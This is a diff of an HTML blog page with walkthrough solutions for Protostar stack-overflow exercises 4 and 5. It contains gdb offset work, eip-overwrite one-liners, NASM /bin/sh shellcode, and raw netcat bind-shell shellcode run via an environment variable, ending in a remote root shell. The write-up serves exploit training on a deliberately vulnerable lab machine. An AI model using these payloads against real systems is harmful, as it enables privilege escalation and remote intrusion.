@@ -7,7 +7,8 @@
 	<meta name="author" content="Louis Li">
 
 	
-	<meta name="description" content="Protostar Stack Exploits (Solutions 4-5) Buffer overflow exploit exercises, part two. Overview Protostar is a series of exercises from Exploit &hellip;">
+	<meta name="description" content="Protostar Stack Exploits (Solutions 4-5) Buffer overflow exploit exercises, part two. Overview
+Protostar is a series of exercises from Exploit &hellip;">
 	
 
   <!-- http://t.co/dKP3o1e -->
@@ -23,6 +24,9 @@
 	<link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
 	<!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
 	<script src="//ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
+        <script type="text/javascript"
+            src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+          </script>
 	<link href='http://fonts.googleapis.com/css?family=Open+Sans:400italic,400,700' rel='stylesheet' type='text/css'>
 	<!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
 <link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
@@ -96,32 +100,22 @@
 				<div id="content" class="inner"><article class="post" itemscope itemtype="http://schema.org/BlogPosting">
 	<h1 class="title" itemprop="name">Protostar Stack Exploits (Solutions 4-5)</h1>
         <h3 class="subtitle" itemprop="subtitle">Buffer overflow exploit exercises, part two. </h3>
-	<div class="entry-content" itemprop="articleBody"><h1>Overview</h1>
-
+	<div class="entry-content" itemprop="articleBody"><h1 id="overview">Overview</h1>
 <p><strong>Protostar</strong> is a series of exercises from <a href="http://exploit-exercises.com/protostar">Exploit Exercises</a>. In addition to three final levels, it has four basic sections: network programming, format strings, heap overflows, and stack overflows.</p>
 
-<p>This series of posts contains solutions and walkthroughs for the stack overflow levels (&ldquo;Stack&rdquo;). It assumes basic knowledge of systems programming and is meant to serve as a reference for those stuck on certain levels. This is the second of three posts for Stack.</p>
+<p>This series of posts contains solutions and walkthroughs for the stack overflow levels (“Stack”). It assumes basic knowledge of systems programming and is meant to serve as a reference for those stuck on certain levels. This is the second of three posts for Stack.</p>
 
-<h1>Solutions</h1>
-
-<h2>Stack: Level 4</h2>
-
-<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack4">full</a>): Overwrite the <a href="http://en.wikibooks.org/wiki/X86_Assembly/X86_Architecture#Instruction_Pointer">eip register</a> to change execution flow.</p>
+<h1 id="solutions">Solutions</h1>
+<p>## Stack: Level 4
+<strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack4">full</a>): Overwrite the <a href="http://en.wikibooks.org/wiki/X86_Assembly/X86_Architecture#Instruction_Pointer">eip register</a> to change execution flow.</p>
 
 <p>First, we want to find the offset to the return address. We can explore using gdb and a breakpoint on <code>main</code>.</p>
 
-<div>
-  <pre><code class='console'>$ gdb ./stack4</code></pre>
-</div>
-
-
-
+<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> gdb ./stack4</code></pre></div>
 
 <!-- more -->
 
-
-<div>
-  <pre><code class='text'>(gdb) break main
+<div class="highlight"><pre><code class="language-text" data-lang="text">(gdb) break main
 Breakpoint 1 at 0x8048411: file stack4/stack4.c, line 15.
 (gdb) run
 Starting program: /opt/protostar/bin/stack4
@@ -152,148 +146,116 @@ ebp at 0xbffff7c8, eip at 0xbffff7cc
 (gdb) p 0xbffff7cc - 0xbffff780
 = 76
 (gdb) info address win
-Symbol &quot;win&quot; is a function at address 0x80483f4.</code></pre>
-</div>
-
+Symbol &quot;win&quot; is a function at address 0x80483f4.</code></pre></div>
 
 <ul>
-<li><code>info frame</code>: Shows the normal location of the saved instruction pointer, <code>eip</code>: <code>0xb7eacc76</code>.</li>
-<li><code>x/32xw $esp</code>: Examines the current stack frame. The buffer starts at <code>0xbffff780</code> with <code>0x414141</code> (AAAA).</li>
-<li><code>p 0xbffff7cc - 0xbffff780</code>: Calculates <code>&amp;eip - &amp;buffer</code>, giving an offset to eip.
+  <li><code>info frame</code>: Shows the normal location of the saved instruction pointer, <code>eip</code>: <code>0xb7eacc76</code>.</li>
+  <li><code>x/32xw $esp</code>: Examines the current stack frame. The buffer starts at <code>0xbffff780</code> with <code>0x414141</code> (AAAA).</li>
+  <li><code>p 0xbffff7cc - 0xbffff780</code>: Calculates <code>&amp;eip - &amp;buffer</code>, giving an offset to eip.
 Using the offset calculated above, <code>eip</code> is redirected to the address of <code>win()</code> function.</li>
 </ul>
 
+<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">echo</span> -e <span class="s2">&quot;$(perl -e &quot;</span>print <span class="s1">&#39;A&#39;</span>x76<span class="s2">&quot;)\xf4\x83\x04\x08&quot;</span> <span class="p">|</span> ./stack4
+<span class="go">code flow successfully changed</span>
+<span class="go">Segmentation fault</span></code></pre></div>
 
-<div>
-  <pre><code class='console'>$ echo -e &quot;$(perl -e &quot;print &#39;A&#39;x76&quot;)\xf4\x83\x04\x08&quot; | ./stack4
-code flow successfully changed
-Segmentation fault</code></pre>
-</div>
-
-
-<h2>Stack: Level 5</h2>
-
+<h2 id="stack-level-5">Stack: Level 5</h2>
 <p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack5">full</a>): Use buffer overflow to execute shellcode on a suid root program, <code>stack5</code>.</p>
 
-<h3>Utilities</h3>
+<h3 id="utilities">Utilities</h3>
 
 <p><code>~/nop</code>:</p>
 
-<div>
-  <pre><code class='perl'>#!/usr/bin/perl
-# Prints argv[0] number of NOP instructions to stdout
-print &quot;\x90&quot;x$ARGV[0]</code></pre>
-</div>
-
+<div class="highlight"><pre><code class="language-perl" data-lang="perl"><span class="c1">#!/usr/bin/perl</span>
+<span class="c1"># Prints argv[0] number of NOP instructions to stdout</span>
+<span class="k">print</span> <span class="s">&quot;\x90&quot;</span><span class="n">x</span><span class="nv">$ARGV</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span></code></pre></div>
 
 <p><code>~/envaddr.c</code>:</p>
 
-<div>
-  <pre><code class='c'>// Prints the approximate address of an environmental variable
-#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
+<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="c1">// Prints the approximate address of an environmental variable</span>
+<span class="cp">#include &lt;stdio.h&gt;</span>
+<span class="cp">#include &lt;stdlib.h&gt;</span>
 
-int main(int argc, char **argv) {
-    char *addr = getenv(argv[1]);
-    if (addr == NULL) {
-        printf(&quot;%s not found\n&quot;, argv[1]);
-        return 1;
-    }
-    else {
-        printf(&quot;%s is at address %p\n&quot;, argv[1], getenv(argv[1]));
-    }
-}</code></pre>
-</div>
-
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">addr</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">addr</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s not found</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s is at address %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">getenv</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]));</span>
+    <span class="p">}</span>
+<span class="p">}</span></code></pre></div>
 
 <p>These utilities will be used in future solutions as well.</p>
 
-<h3>Solution</h3>
+<h3 id="solution">Solution</h3>
 
-<h4>Overview</h4>
-
+<h4 id="overview-1">Overview</h4>
 <p>From a high level, this is our approach:
 1. Store the shellcode in an environmental variable.
 2. Find the approximate address of the environmental variable on the stack.
 3. Overwriting the return address in <code>stack5</code> with the address of the environmental variable, we execute the shellcode.</p>
 
-<p>There are various ways to execute shellcode, but it&rsquo;s more reliable to keep the shellcode in an environmental variable rather than the buffer in case it&rsquo;s larger than the buffer (64 bytes).</p>
+<p>There are various ways to execute shellcode, but it’s more reliable to keep the shellcode in an environmental variable rather than the buffer in case it’s larger than the buffer (64 bytes).</p>
 
-<h4>Executing <code>/bin/sh</code></h4>
-
+<h4 id="executing-binsh">Executing <code>/bin/sh</code></h4>
 <p>The shellcode is a modified version of the code from <em>Hacking: The Art of Exploitation</em>. It runs the command <code>/bin//sh -sli</code>.</p>
 
-<div>
-  <pre><code class='nasm'>BITS 32
+<div class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="k">BITS</span> <span class="mi">32</span>
 
-xor eax, eax
-push eax
-push 0x68732f2f   ; chars for /bin//sh
-push 0x6e69622f
-mov ebx, esp
-push eax
-mov edx, esp
+<span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
+<span class="nf">push</span> <span class="nb">eax</span>
+<span class="nf">push</span> <span class="mh">0x68732f2f</span>   <span class="c1">; chars for /bin//sh</span>
+<span class="nf">push</span> <span class="mh">0x6e69622f</span>
+<span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">esp</span>
+<span class="nf">push</span> <span class="nb">eax</span>
+<span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">esp</span>
 
-push eax
-push 0x736c692d   ; -sli flags
-push eax
-mov ecx, esp
-mov al, 11
-int 0x80</code></pre>
-</div>
+<span class="nf">push</span> <span class="nb">eax</span>
+<span class="nf">push</span> <span class="mh">0x736c692d</span>   <span class="c1">; -sli flags</span>
+<span class="nf">push</span> <span class="nb">eax</span>
+<span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>
+<span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mi">11</span>
+<span class="nf">int</span> <span class="mh">0x80</span></code></pre></div>
 
+<p>We’ll overwrite the return address with the address of our shellcode environmental variable.</p>
 
-<p>We&rsquo;ll overwrite the return address with the address of our shellcode environmental variable.</p>
+<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">export </span><span class="nv">SC</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> -n <span class="k">$(</span>~/nop 100<span class="k">)$(</span>cat /home/user/shell<span class="k">))</span>
+<span class="gp">$</span> ~/envaddr SC
+<span class="go">SC is at address 0xbffffefa</span>
+<span class="gp">$</span> <span class="nb">echo</span> -n <span class="k">$(</span>perl -e <span class="s1">&#39;print &quot;\xfa\xfe\xff\xbf&quot;x25&#39;</span><span class="k">)</span> <span class="p">|</span> /opt/protostar/bin/stack5</code></pre></div>
 
-<div>
-  <pre><code class='console'>$ export SC=$(echo -n $(~/nop 100)$(cat /home/user/shell))
-$ ~/envaddr SC
-SC is at address 0xbffffefa
-$ echo -n $(perl -e &#39;print &quot;\xfa\xfe\xff\xbf&quot;x25&#39;) | /opt/protostar/bin/stack5</code></pre>
-</div>
+<p>Nothing happened! Let’s take a look with GDB.</p>
 
-
-<p>Nothing happened! Let&rsquo;s take a look with GDB.</p>
-
-<div>
-  <pre><code class='text'>[user@protostar:~]$ echo -n $(perl -e &#39;print &quot;\xfa\xfe\xff\xbf&quot;x25&#39;) &gt; /tmp/sc-shell
+<div class="highlight"><pre><code class="language-text" data-lang="text">[user@protostar:~]$ echo -n $(perl -e &#39;print &quot;\xfa\xfe\xff\xbf&quot;x25&#39;) &gt; /tmp/sc-shell
 [user@protostar:~]$ gdb /opt/protostar/bin/stack5
 Reading symbols from /opt/protostar/bin/stack5...done.
 (gdb) run &lt; /tmp/sc-shell
 Starting program: /opt/protostar/bin/stack5 &lt; /tmp/sc-shell
 Executing new program: /bin/dash
 
-Program exited normally.</code></pre>
-</div>
+Program exited normally.</code></pre></div>
 
+<p>The shell opens, but it exits immediately. The shellcode is executing, but there’s another issue: as documented <a href="http://stackoverflow.com/questions/10767070/buffer-overflow-program-terminates-after-spawning-a-shell">here</a> and <a href="http://forums.freebsd.org/showthread.php?t=10054">here</a>, opening shells from stdin is problematic.</p>
 
-<p>The shell opens, but it exits immediately. The shellcode is executing, but there&rsquo;s another issue: as documented <a href="http://stackoverflow.com/questions/10767070/buffer-overflow-program-terminates-after-spawning-a-shell">here</a> and <a href="http://forums.freebsd.org/showthread.php?t=10054">here</a>, opening shells from stdin is problematic.</p>
-
-<h4>Opening a shell through netcat</h4>
-
-<p>We know that our shellcode does run, but it can&rsquo;t open a shell. However, there are a wide a wide array of exploits available besides running <code>/bin/sh</code>. We could dump <a href="http://en.wikipedia.org/wiki//etc/shadow">/etc/shadow/</a> and use <a href="http://www.openwall.com/john/">John the Ripper</a> to crack the passwords. Another option is to open up a remote shell through <a href="http://linux.die.net/man/1/nc">netcat</a>. We&rsquo;ll use the netcat solution.</p>
+<h4 id="opening-a-shell-through-netcat">Opening a shell through netcat</h4>
+<p>We know that our shellcode does run, but it can’t open a shell. However, there are a wide a wide array of exploits available besides running <code>/bin/sh</code>. We could dump <a href="http://en.wikipedia.org/wiki//etc/shadow">/etc/shadow/</a> and use <a href="http://www.openwall.com/john/">John the Ripper</a> to crack the passwords. Another option is to open up a remote shell through <a href="http://linux.die.net/man/1/nc">netcat</a>. We’ll use the netcat solution.</p>
 
 <p>Using <a href="http://shell-storm.org/shellcode/files/shellcode-684.php">netcat shellcode</a>, we go through the same process <a href="https://gist.github.com/9e403a2889a07eeb84a9">(plaintext gist)</a>:</p>
 
-<div>
-  <pre><code class='console'>$ echo -ne &quot;\xeb\x2a\x5e\x31\xc0\x88\x46\x07\x88\x46\x0f\x88\x46\x19\x89\x76\x1a\x8d\x5e\x08\x89\x5e\x1e\x8d\x5e\x10\x89\x5e\x22\x89\x46\x26\xb0\x0b\x89\xf3\x8d\x4e\x1a\x8d\x56\x26\xcd\x80\xe8\xd1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x6e\x63\x23\x2d\x6c\x70\x38\x30\x38\x30\x23\x2d\x65\x2f\x62\x69\x6e\x2f\x73\x68\x23&quot; &gt; ~/sc-nc-8080
-$ export SC=$(echo -ne $(~/nop 100)$(cat /home/user/sc-nc-8080))
-$ ~/envaddr SC
-SC is at address 0xbffffece
-$ echo -n $(perl -e &#39;print &quot;\xce\xfe\xff\xbf&quot;x25&#39;) | /opt/protostar/bin/stack5
-&lt;waiting&gt;</code></pre>
-</div>
-
+<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">echo</span> -ne <span class="s2">&quot;\xeb\x2a\x5e\x31\xc0\x88\x46\x07\x88\x46\x0f\x88\x46\x19\x89\x76\x1a\x8d\x5e\x08\x89\x5e\x1e\x8d\x5e\x10\x89\x5e\x22\x89\x46\x26\xb0\x0b\x89\xf3\x8d\x4e\x1a\x8d\x56\x26\xcd\x80\xe8\xd1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x6e\x63\x23\x2d\x6c\x70\x38\x30\x38\x30\x23\x2d\x65\x2f\x62\x69\x6e\x2f\x73\x68\x23&quot;</span> &gt; ~/sc-nc-8080
+<span class="gp">$</span> <span class="nb">export </span><span class="nv">SC</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> -ne <span class="k">$(</span>~/nop 100<span class="k">)$(</span>cat /home/user/sc-nc-8080<span class="k">))</span>
+<span class="gp">$</span> ~/envaddr SC
+<span class="go">SC is at address 0xbffffece</span>
+<span class="gp">$</span> <span class="nb">echo</span> -n <span class="k">$(</span>perl -e <span class="s1">&#39;print &quot;\xce\xfe\xff\xbf&quot;x25&#39;</span><span class="k">)</span> <span class="p">|</span> /opt/protostar/bin/stack5
+<span class="go">&lt;waiting&gt;</span></code></pre></div>
 
 <p>On another machine, complete the newly waiting connection:</p>
 
-<div>
-  <pre><code class='console'>$[louis@neutrino ~]$ nc 192.168.1.10 8080
-whoami
-root</code></pre>
-</div>
-
-
+<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="o">[</span>louis@neutrino ~<span class="o">]</span><span class="nv">$ </span>nc 192.168.1.10 8080
+<span class="go">whoami</span>
+<span class="go">root</span></code></pre></div>
 
 </div>
 
